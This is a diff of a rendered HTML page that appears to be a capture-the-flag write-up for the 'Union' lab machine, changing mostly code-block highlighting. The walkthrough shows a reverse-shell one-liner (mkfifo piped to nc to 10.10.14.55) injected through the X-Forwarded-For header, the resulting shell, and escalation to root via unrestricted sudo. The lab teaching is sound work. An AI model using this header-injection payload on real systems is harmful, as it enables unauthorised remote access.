-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uhc@union:~$ uname -a
-</span></span><span style="display:flex;"><span>Linux union 5.4.0-77-generic <span style="color:#75715e">#86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>uhc@union:~$ uname -a
+</span></span><span style="display:flex;"><span>Linux union 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 </span></span></code></pre></div><p>Something I&rsquo;ve learned is to try to restrain yourself from immediately attempting to exploit anything you find. Yes, if it works, then we will have saved a bit of time. But if it doesn&rsquo;t, you may spend hours going down a rabbit hole when there is an easier way. It&rsquo;s important to do some basic enumeration, get a list of potential paths, and then start with the most likely one and work your way down the list.</p>
 <p>We can&rsquo;t really find anything else, so we try the Netfilter exploits. No dice. We&rsquo;ve done all of our enumeration and can&rsquo;t find any privilege escalation paths. So let&rsquo;s think back to what happened earlier: we entered a flag and then our IP was address allowed to access SSH. Let&rsquo;s see how the web app did this by looking at the firewall.php file:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>
@@ -685,7 +655,7 @@
 </span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">section</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
 </span></span></code></pre></div><p>Let&rsquo;s try to get a shell. First we set up a nc listener:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$nc -nvlp <span style="color:#ae81ff">7777</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nvlp <span style="color:#ae81ff">7777</span>
 </span></span></code></pre></div><p>Then we add our payload to the x-forwarded-for header:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /firewall.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
 </span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.128</span>
@@ -700,23 +670,23 @@
 </span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
 </span></span><span style="display:flex;"><span>X-FORWARDED-FOR<span style="color:#f92672">:</span> <span style="color:#ae81ff">;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.55 7777 &gt;/tmp/f;</span>
 </span></span></code></pre></div><p>And we get a call back!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$nc -nvlp <span style="color:#ae81ff">7777</span>
-</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">7777</span> ...
-</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.55<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.128<span style="color:#f92672">]</span> <span style="color:#ae81ff">59200</span>
-</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nvlp <span style="color:#ae81ff">7777</span>
+</span></span><span style="display:flex;"><span>listening on [any] 7777 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.55] from (UNKNOWN) [10.10.11.128] 59200
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can&#39;t access tty; job control turned off
 </span></span><span style="display:flex;"><span>$ whoami
 </span></span><span style="display:flex;"><span>www-data
 </span></span></code></pre></div><p>We can run all commands as sudo.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo -l
-</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> www-data on union:
-</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>User www-data may run the following commands on union:
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: ALL
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries for www-data on union:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>User www-data may run the following commands on union:
+</span></span><span style="display:flex;"><span>    (ALL : ALL) NOPASSWD: ALL
 </span></span></code></pre></div><p>So now we just do a <code>sudo -i</code> and get root access to find our flag!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo -i
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ sudo -i
 </span></span><span style="display:flex;"><span>id
-</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
 </span></span><span style="display:flex;"><span>ls
 </span></span><span style="display:flex;"><span>root.txt
 </span></span><span style="display:flex;"><span>snap
